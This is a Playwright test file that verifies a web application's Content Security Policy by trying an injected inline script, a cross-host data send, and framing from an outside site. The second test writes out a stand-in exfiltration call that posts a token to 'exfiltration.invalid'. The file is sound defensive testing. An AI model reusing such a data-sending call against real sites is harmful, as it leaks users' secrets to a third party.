import { expect, test } from './csp-guard.js';

/**
 * The policy's three promises, each provoked on purpose: an inline script the
 * build did not emit does not run, a script cannot send data to another host,
 * and another site cannot frame the application while the application frames
 * its own pages. `astro preview` sends the production header and every page
 * carries the build's hashed `<meta>` policy, so this is the shipped policy.
 */

test.use({ allowCspViolations: true });

const EXFILTRATION_HOST = 'https://exfiltration.invalid';

test('an injected inline script does not run', async ({ page }) => {
  await page.goto('/control/login');
  const violation = page.evaluate(
    () =>
      new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (event) =>
          resolve(event.effectiveDirective),
        ),
      ),
  );

  await page.evaluate(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__injected = true;';
    document.head.append(script);
  });

  expect(await violation).toBe('script-src-elem');
  expect(await page.evaluate(() => (window as { __injected?: boolean }).__injected)).toBe(
    undefined,
  );
});

test('a script cannot send data to another host', async ({ page }) => {
  // The browser itself refuses the request before it reaches the network: the
  // proof is the `connect-src` violation, not an answer from any server.
  await page.goto('/control/login');

  const violation = page.evaluate(
    () =>
      new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (event) =>
          resolve(`${event.effectiveDirective} ${event.blockedURI}`),
        ),
      ),
  );
  const outcome = await page.evaluate(async (host) => {
    try {
      await fetch(`${host}/collect?token=secret`, { method: 'POST', body: 'secret' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  }, EXFILTRATION_HOST);

  expect(outcome).toBe('blocked');
  expect(await violation).toBe(`connect-src ${EXFILTRATION_HOST}/collect?token=secret`);
});

test('another site cannot frame the application, while the application frames itself', async ({
  page,
  baseURL,
}) => {
  const external = 'http://framing-site.test/';
  await page.route(external, (route) =>
    route.fulfill({
      contentType: 'text/html',
      body: `<!doctype html><title>external</title><iframe name="victim" src="${baseURL}/help/"></iframe>`,
    }),
  );
  await page.goto(external);
  // A frame the browser refuses to render is left on Chromium's error page.
  await expect.poll(() => page.frame({ name: 'victim' })?.url()).toMatch(/^chrome-error:/);

  await page.goto('/help/');
  await page.evaluate(() => {
    const frame = document.createElement('iframe');
    frame.name = 'own';
    frame.src = '/help/';
    document.body.append(frame);
  });
  const own = page.frameLocator('iframe[name="own"]');
  await expect(own.getByRole('heading', { name: 'CopaLibre Help' })).toBeVisible();
});
